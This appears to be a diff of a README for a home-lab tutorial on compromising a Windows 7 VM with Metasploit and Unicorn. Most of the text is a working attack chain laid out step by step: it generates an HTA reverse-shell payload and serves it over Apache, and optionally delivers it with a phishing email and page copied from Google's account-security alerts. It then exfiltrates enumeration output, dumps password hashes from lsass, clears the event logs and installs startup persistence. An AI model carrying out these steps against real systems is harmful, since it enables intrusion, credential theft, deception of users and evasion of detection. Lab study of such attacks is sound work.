@@ -3,17 +3,17 @@ I have built this demonstrate attacking a Windows 7 machine using Metasploit and
 
 ## Environment Details
 
-Kali Linux from https://www.kali.org/downloads/  
-Unicorn from https://github.com/trustedsec/unicorn  
-Windows 7 ISO en_windows_7_professional_with_sp1_x64_dvd_u_676939.iso from https://the-eye.eu/public/MSDN/Windows%207/  
-VMware 11.5 on MacOS Catalina 10.15.2 but you can use other HyperVisors.  
-**I would NOT reccomend AWS/Azure as they may interpret these activities as malicous and kill your environment/account**  
-VMware Fusion lower than 11 have display issues with VM's on MacOS Catalina  
+Kali Linux https://www.kali.org/downloads/  
+Unicorn https://github.com/trustedsec/unicorn  
+Windows 7 ISO en_windows_7_professional_with_sp1_x64_dvd_u_676939.iso https://the-eye.eu/public/MSDN/Windows%207/  
+VMware Fusion 11.5 on MacOS Catalina 10.15.2. VirtualBox is a good alternative. 
+VMware Fusion 10 had display issues with MacOS Catalina  
+**I would NOT reccomend AWS/Azure/GCP as they may detect these activities as malicious** 
 
 ## Kali Setup
 
 Download and install the latest Kali Linux 64-Bit Image https://www.kali.org/downloads/  
-Once your VM is up and running login prepare Metasploit, Apache, and Postgresql for use.
+Once your VM is up and running, login and prepare Metasploit, Apache, and Postgresql for use.
 
 ```
 apt update  
@@ -25,11 +25,7 @@ systemctl start apache2
 msfconsole  
 exit
 ```
-, perform all available updates, and enable Apache and Postgresql, and start up Metasp
-Run 'apt update' and then 'apt upgrade'. This will update Kali to the latest including metasploit which we will be using.  
-Enable Postgresql and Apache2 to start at boot 'systemctl enable postgresql' and 'systemctl enable apache2'  
-Start Postgresql and Apache2 "systemctl start postgresql' and 'systemctl start apache2'  
-Start Metasploit "msfconsole' to initialize the db then 'exit' out  
+Those steps will update Kali, enable postgresql and apache to start automatically, and initiliaze your Metasploit database.
 
 ## Windows 7 Setup
  
@@ -38,58 +34,162 @@ During install I created an administrator account named "admin". If you use a di
 If you are testing against an AV solution, ensure your policies are in "Detect Only" mode.  
 Upgrade Internet Explorer to version 11 by downloading to your host system and then dragging the exe into your VM  
     Note that Windows 7 lacks the appropriate certificates to browse https sites without this update https://go.microsoft.com/fwlink/?LinkId=324629
-Disable UAC. You can google this if your not sure how.  
+Disable UAC. You can do this numerous ways.
 
 
-## Setup Kali (All done in a Terminal window, if you are not root you may need to use sudo for some commands)
+## Unicorn Setup
 
-Switch to /opt 'cd /opt'  
-Download Unicorn 'git clone https://github.com/trustedsec/unicorn.git'  
-Run 'ifconfig' and note your IP  
-Switch to /opt/unicorn 'cd /opt/unicorn'  
+Here I will show you how to grab your IP address, configure Unicorn, and modify options.  
+Make note of your IP Address and replace my sample with your IP.  
+
+```
+ifconfig 
+cd /opt
+git clone https://github.com/trustedsec/unicorn.git
+cd /opt/unicorn
+python unicorn.py windows/meterpreter/reverse_tcp 172.16.105.131 4444 hta
+```
+
+If you are not familiar with vi here is a quick guide. https://www.thegeekdiary.com/basic-vi-commands-cheat-sheet/  
+Use vi or your favorite text editor to modify the hta_attack/unicorn.rc file.  
+
+```
+vi hta_attack/unicorn.rc
+```
+In vi you can hit `i` to interact, cursor to the attributes, make your changes, hit the `esc` key, and enter `:wq` to save and quit  
+Modify the following attributes and save your changes.  
+```
+AutoVerifySession true
+AutoSystemInfo true
+AutoLoadStdapi true
+```
+ 
+These steps generate the Unicorn HTA payload, copy the payload into apache, and configures the metasploit configuration to support the remaining steps.  
 Review the README.md  
-Run unicorn.py using your kali IP and hta method for revese_tcp payload 'python unicorn.py windows/meterpreter/reverse_tcp 172.16.105.131 4444 hta'  
-This generates and hta_attack folder that you now copy to /var/www/html 'cp hta_attack /var/www/html'  
-Switch to /var/www/html/hta_attack 'cd /var/www/html/hta_attack'  
-Use your favorite editor to modify unicorn.rc 'vi unicorn.rc'  
-Make sure AutoVerifySession, AutoSystemInfo, and AutoLoadStdapi are all set to true then save your changes    
 
-This generates the payload and metasploit configuration into our apache instance.  
-In my case the URL is http://172.16.105.131/hta_attack/  
-What i did next was generated a security event warning to my Google email. I copied the email and changed the "Check Activity" URL to the URL above". I also went into my Google account to the Security settings page and saved this page. I then edited /var/www/html/hta_attack/index.html and inserted the google code below the existing code making a slight modification to tell users to run the Security Checker tool when prompted. It's not perfect but its good enough to demonstrate a phishing attempt. You could clean this all up to better replicate the FROM address on the email and ensure the page looks exactly like the Google page.
+```
+cat /opt/unicorn/README.md
+```
 
+## Payload Delivery
 
-## Next is to setup what we will do once we click the email link and open Launncher.hta
+While there are multiple ways to deliver the payload I opted to put it into Apache on my Kali VM.
 
-Download this repo that contains my demo.rc script  
-Go back to /opt 'cd /opt/' and clone this repo 'git clone https://github.com/wond696/unicorn-demo.git'  
-Switch to /opt/unicorn-demo and review demo.rc 'cd /opt/unicorn-demo' and 'cat demo.rc'  
-My script is based on being logged in as a user named "admin", you may have to make modifications if you use a different account. Also, ensure the quotes in the file remain quotes, some text editors try to change one to a reverse quote which breaks the process  
-You can modify this however you want but I found that trying to run everything in the script dies after creating a shell and causes a keyboard buffering problem so I'm only do base collection in the script and uploading files.  
+```
+cp hta_attack /var/www/html
+cd /var/www/html/hta_attack
+```
+
+In my case the payload URL is http://172.16.105.131/hta_attack/  
+You can launch this page directly and Run/Open the Launcher.hta when prompted, or you can take additional steps for delivery 
 
 ## Download JAWS
+
+```
+cd /opt
+git clone https://github.com/411Hall/JAWS.git
+```
 'cd /opt' and 'git clone https://github.com/411Hall/JAWS.git'  
-Review the README.md 'cat /opt/JAWS/README.md'  
-  
-Start our metasploit listener 'msfconsole -r /var/www/html/hta_attack/unicorn.rc'  
-Launch the attack by clicking the email link or browsing to http://172.16.105.131/hta_attack/ and run/open the file when prompted  
+Review the README.md  
+
+```
+cat /opt/JAWS/README.md\
+```  
+
+## Optional - Adding delivery via spearphishing
+
+What I did next was generate a security event warning to my Google email. I copied the email and changed the "Check Activity" URL to the payload URL.  
+I also went into my Google account to the Security settings page and saved this page.  
+I then edited /var/www/html/hta_attack/index.html and inserted the google code below the existing code making a slight modification to tell users to run the Security Checker tool when prompted.  
+It's not perfect but its good enough to demonstrate a phishing attempt. You could clean this all up to better replicate the FROM address on the email and ensure the page looks exactly like the Google page.
+
+## Download Unicorn Demo
+
+I have select a few commands to run as a script in the meterpreter environment as one way to collect information.  
+
+```
+cd /opt
+git clone https://github.com/wond696/unicorn-demo.git
+```
+
+Review the README.md  
+
+```
+cat /opt/unicorn-demo/README.md
+```  
+
+### Unicorn Demo Assumptions
+
+My script is based on being logged in as a user named "admin", you will have to make modifications if you used a different account in your Windows 7 VM.  
+Ensure the quotes in the file remain quotes, some text editors try to change one to a reverse quote which breaks the process  
+You can modify this however you want but I found that trying to run everything in the script dies after creating a shell and some commands cause a keyboard buffering problem, so I only do base collection in the script and upload the Launcher.hta and JAWS script.  
+
+## Start the Metasploit listener
+
+Move back to /opt where we will drop our collected file and start the Metasploit listener
+
+```
+cd /opt
+msfconsole -r /var/www/html/hta_attack/unicorn.rc'  
+```
+
+This launches our listener using windows/meterpreter/reverse_tcp on port 4444.
+
+## Launch the attack
+
+Launch the attack by clicking the email link or browsing to http://172.16.105.131/hta_attack/ in Internet Explorer in your WIndows 7 VM.  
+When prompted, run/open the Launcher.hta.   
 This will generate a reverse tcp onto port 4444, you should see the session start.  
-Confirm the session 'sessions -i'  
-Connect to the session number 'sessions -i 1'  
-Run demo.rc at the meterpreter prompt 'run /opt/unicorn-demo/demo.rc'  
-Run the following commands (You may have to hit enter after the powershell commands run)  
-'shell'  
-'powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted' Enables powershell script execution.  
-'powershell ./jaws-enum.ps1 exfil.txt' On your Windows 7 VM watch the C:\Users\Admin folder, when its done exfil.txt should be a little over 100k in size.  
-'exit'  
-'download exfil.txt'  
-'rm jaws-enum.ps1'  
-'rm exfil.txt'  
-'run post/windows/manage/migrate' This should migrate you to a new notepad.exe process.  
-'ps' Review and find the pid for lsass.exe  
-'migrate 592' Use the pid for lsass.exe If this works you are now under a SYSTEM process.  
-'hashdump' This will give you hashes that you might be able to convert to plaintext in jacktheripper or https://crackstation.net/  
-'clearev' Clears Windows Logs
+Once the session is connected we will interact with that session to collect information, migrate to a SYSTEM process, and clean up our activity leaving Launcher.hta to start automatically when the "admin" user logs in.
 
+```
+sessions -i
+sessions -i 1
+run /opt/unicorn-demo/demo.rc
+```
 
-If you have followed this precisly and made changes to IP and username where needed you should have gather a lot of system information, have a exfil.txt file in your current directory, Launcher.hta should now be persitent by being in the users Start Menu > Startup. Reboot your Windows 7 VM to test, it should reconnect after you login.
+That completes the commands in my demo.rc script. Next we will interact with the Windows shell, commands must be executed one at a time.
+
+```
+shell  
+powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted 
+powershell ./jaws-enum.ps1 exfil.txt
+```
+
+On your Windows 7 VM watch the C:\Users\Admin folder, when its done exfil.txt should be a little over 100k in size.  
+
+```
+exit  
+download exfil.txt  
+rm jaws-enum.ps1 
+rm exfil.txt
+run post/windows/manage/migrate
+```
+
+The last command uses meterpreter to migrate you to a new notepad.exe process.  
+
+Next we will look for the pid of the Lsass.exe process and migrate to that.  
+If the pid you see if different use the one you see.
+Assuming that works we shoudl be able finish by performing a hashdump and clear the Windows Event Logs.  
+
+```
+ps  
+migrate 592
+hashdump' 
+clearev
+exit
+```
+
+For fun, copy/paste the hashes and see if you can convert them to plaintext in jacktheripper or https://crackstation.net/.  
+This step may take some additional research on your part.
+
+## Review exlif.txt
+
+```
+cat /opt/exfil.txt
+```
+
+## Results
+
+If you have followed this precisely you should have gathered plenty of system information, have a exfil.txt file in /opt, Launcher.hta should now be persitent by being in the users Start Menu > Startup.  
+Reboot your Windows 7 VM to test, it should reconnect as session 2 after you login.
